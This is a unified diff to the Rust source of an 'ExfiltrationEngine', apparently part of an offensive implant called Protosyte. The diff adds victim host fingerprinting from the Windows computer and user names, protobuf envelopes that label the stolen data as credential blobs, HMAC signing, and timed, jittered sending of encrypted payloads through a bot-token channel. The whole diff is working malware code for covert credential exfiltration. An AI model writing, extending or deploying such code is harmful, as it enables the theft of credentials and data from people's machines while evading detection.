@@ -6,8 +6,14 @@ use tokio::time::{sleep, Instant};
 use reqwest::Client;
 use zeroize::Zeroize;
 use std::env;
+use std::str::FromStr;
 
 use crate::crypto::CryptoManager;
+use crate::proto::{Envelope, DataBlob, envelope::Payload, data_blob::DataType};
+use prost::Message;
+use prost_types::Timestamp;
+use sha2::{Sha256, Digest};
+use hmac::{Hmac, Mac};
 
 fn get_bot_token() -> String {
     env::var("PROTOSYTE_BOT_TOKEN")
@@ -31,16 +37,50 @@ pub struct ExfiltrationEngine {
     data_rx: mpsc::UnboundedReceiver<Vec<u8>>,
     interval: Duration,
     jitter: f32,
+    mission_id: u64,
+    sequence: std::sync::atomic::AtomicU32,
+    host_fingerprint: Vec<u8>,
 }
 
 impl ExfiltrationEngine {
     pub fn new(crypto: Arc<CryptoManager>, data_rx: mpsc::UnboundedReceiver<Vec<u8>>) -> Self {
+        // Get mission ID from environment
+        let mission_id = env::var("PROTOSYTE_MISSION_ID")
+            .unwrap_or_else(|_| "0xDEADBEEFCAFEBABE".to_string());
+        let mission_id_uint = u64::from_str_radix(
+            mission_id.trim_start_matches("0x"),
+            16
+        ).unwrap_or(0xDEADBEEFCAFEBABE);
+        
+        // Generate host fingerprint
+        let host_fingerprint = Self::generate_host_fingerprint();
+        
         Self {
             crypto,
             data_rx,
             interval: Duration::from_secs(347),
             jitter: 0.25,
+            mission_id: mission_id_uint,
+            sequence: std::sync::atomic::AtomicU32::new(0),
+            host_fingerprint,
         }
+    }
+    
+    fn generate_host_fingerprint() -> Vec<u8> {
+        use sha2::{Sha256, Digest};
+        let mut hasher = Sha256::new();
+        
+        // Use computer name and other Windows identifiers
+        if let Ok(hostname) = env::var("COMPUTERNAME") {
+            hasher.update(hostname.as_bytes());
+        }
+        
+        // Add other static markers
+        if let Ok(username) = env::var("USERNAME") {
+            hasher.update(username.as_bytes());
+        }
+        
+        hasher.finalize().to_vec()
     }
     
     pub async fn start(mut self) {
@@ -81,14 +121,31 @@ impl ExfiltrationEngine {
                 data = self.data_rx.recv() => {
                     match data {
                         Some(raw_data) => {
-                            let encrypted = self.crypto.encrypt(&raw_data).await;
+                            // Encrypt the raw data
+                            let (encrypted_payload, nonce) = self.crypto.encrypt_with_nonce(&raw_data).await;
+                            
+                            // Create Protobuf Envelope
+                            let envelope_result = self.create_envelope(
+                                &encrypted_payload,
+                                &nonce,
+                                raw_data.len() as u32,
+                            );
+                            
+                            let envelope_bytes = match envelope_result {
+                                Ok(bytes) => bytes,
+                                Err(e) => {
+                                    eprintln!("[EXFIL] Failed to create envelope: {}", e);
+                                    continue;
+                                }
+                            };
                             
                             let jitter_duration = self.calculate_jitter();
                             if last_send.elapsed() < self.interval + jitter_duration {
                                 sleep(self.interval + jitter_duration - last_send.elapsed()).await;
                             }
                             
-                            if let Err(e) = self.send_payload(&client, &encrypted).await {
+                            // Send Protobuf-wrapped payload
+                            if let Err(e) = self.send_payload(&client, &envelope_bytes).await {
                                 eprintln!("[EXFIL] Failed to send payload: {}", e);
                             } else {
                                 last_send = Instant::now();
@@ -107,6 +164,75 @@ impl ExfiltrationEngine {
         let jitter_amount = rng.gen_range(-self.jitter..=self.jitter);
         let jitter_secs = (self.interval.as_secs_f32() * jitter_amount) as u64;
         Duration::from_secs(jitter_secs)
+    }
+    
+    fn create_envelope(
+        &self,
+        encrypted_payload: &[u8],
+        nonce: &[u8],
+        original_size: u32,
+    ) -> Result<Vec<u8>, String> {
+        use sha2::{Sha256, Digest};
+        use hmac::{Hmac, Mac};
+        
+        // Get next sequence number
+        let sequence = self.sequence.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+        
+        // Create DataBlob
+        let data_blob = DataBlob {
+            host_fingerprint: self.host_fingerprint.clone(),
+            data_type: DataType::CredentialBlob as i32,
+            encrypted_payload: encrypted_payload.to_vec(),
+            aes_gcm_nonce: nonce.to_vec(),
+            original_size,
+        };
+        
+        // Create Envelope
+        let mut envelope = Envelope {
+            mission_id: self.mission_id,
+            collected_ts: Some(Timestamp {
+                seconds: std::time::SystemTime::now()
+                    .duration_since(std::time::UNIX_EPOCH)
+                    .unwrap()
+                    .as_secs() as i64,
+                nanos: 0,
+            }),
+            sequence,
+            hmac_sha256: vec![],
+            payload: Some(Payload::Data(data_blob)),
+        };
+        
+        // Compute HMAC
+        let hmac_key = env::var("PROTOSYTE_HMAC_KEY")
+            .unwrap_or_else(|_| {
+                env::var("PROTOSYTE_PASSPHRASE")
+                    .unwrap_or_else(|_| "default_key_change_in_production".to_string())
+            });
+        
+        let mut hmac_envelope = Envelope {
+            mission_id: envelope.mission_id,
+            collected_ts: envelope.collected_ts.clone(),
+            sequence: envelope.sequence,
+            hmac_sha256: vec![],
+            payload: envelope.payload.clone(),
+        };
+        
+        let mut hmac_data = Vec::new();
+        hmac_envelope.encode(&mut hmac_data)
+            .map_err(|e| format!("Failed to encode for HMAC: {}", e))?;
+        
+        type HmacSha256 = Hmac<Sha256>;
+        let mut mac = HmacSha256::new_from_slice(hmac_key.as_bytes())
+            .map_err(|e| format!("Failed to create HMAC: {}", e))?;
+        mac.update(&hmac_data);
+        envelope.hmac_sha256 = mac.finalize().into_bytes().to_vec();
+        
+        // Encode final envelope
+        let mut encoded = Vec::new();
+        envelope.encode(&mut encoded)
+            .map_err(|e| format!("Failed to encode envelope: {}", e))?;
+        
+        Ok(encoded)
     }
     
     async fn send_payload(&self, client: &Client, payload: &[u8]) -> Result<(), String> {
